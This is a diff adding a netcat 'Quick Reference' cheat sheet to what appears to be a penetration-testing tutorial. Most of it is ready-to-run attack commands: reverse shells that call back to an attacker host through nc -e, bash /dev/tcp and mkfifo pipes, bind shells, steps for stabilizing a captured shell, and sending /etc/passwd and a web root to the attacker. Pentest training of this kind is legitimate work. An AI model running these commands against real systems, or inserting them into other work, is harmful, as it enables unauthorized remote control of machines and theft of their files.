@@ -48,6 +48,72 @@
 
 ---
 
+## Quick Reference
+
+### Essential Commands
+```bash
+nc -lvnp 4444                                 # Listen on port 4444 (receive shells/files)
+nc <target> <port>                            # Connect to target:port
+nc -lvnp 4444 > file.txt                      # Receive file
+nc <target> <port> < file.txt                 # Send file
+nc -zv <target> <port>                        # Port scan (single port check)
+nc -u <target> <port>                         # UDP connection
+```
+
+### Common Shell Scenarios
+```bash
+# REVERSE SHELL (most common in pentests - target connects back to you)
+# Attacker (listener):
+nc -lvnp 4444
+
+# Target (connects back with shell):
+nc -e /bin/bash <attacker-IP> 4444            # Traditional nc with -e
+bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'  # Bash without nc
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-IP> 4444 >/tmp/f  # mkfifo method
+
+# BIND SHELL (target listens, you connect - rare due to firewalls)
+# Target (listener with shell attached):
+nc -lvnp 4444 -e /bin/bash                    # Traditional nc with -e
+mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1  # mkfifo bind
+
+# Attacker (connects):
+nc <target-IP> 4444
+
+# SHELL STABILIZATION (after catching basic shell)
+python3 -c 'import pty;pty.spawn("/bin/bash")'  # Upgrade to PTY
+export TERM=xterm                              # Set terminal type
+Ctrl+Z (background)                            # Background shell
+stty raw -echo; fg                             # Fix input echo
+stty rows 38 columns 116                       # Match terminal size (from "stty -a")
+```
+
+### File Transfer
+```bash
+# Receiver (attacker getting file from target):
+nc -lvnp 4444 > exfiltrated.zip
+
+# Sender (target):
+nc <attacker-IP> 4444 < /etc/passwd
+
+# Send directory (tar on-the-fly):
+tar czf - /var/www/html | nc <attacker-IP> 4444    # Sender
+nc -lvnp 4444 | tar xzf -                           # Receiver
+```
+
+### Key Flags
+| Flag | Purpose |
+|------|---------|
+| `-l` | Listen mode (server) |
+| `-v` | Verbose output |
+| `-n` | No DNS resolution (faster) |
+| `-p` | Port to listen on |
+| `-e` | Execute command (shell) — not in OpenBSD nc |
+| `-u` | UDP mode (default is TCP) |
+| `-z` | Port scanning mode (no data sent) |
+| `-w` | Timeout for connections |
+
+---
+
 # PHASE 1: FUNDAMENTALS
 
 ---
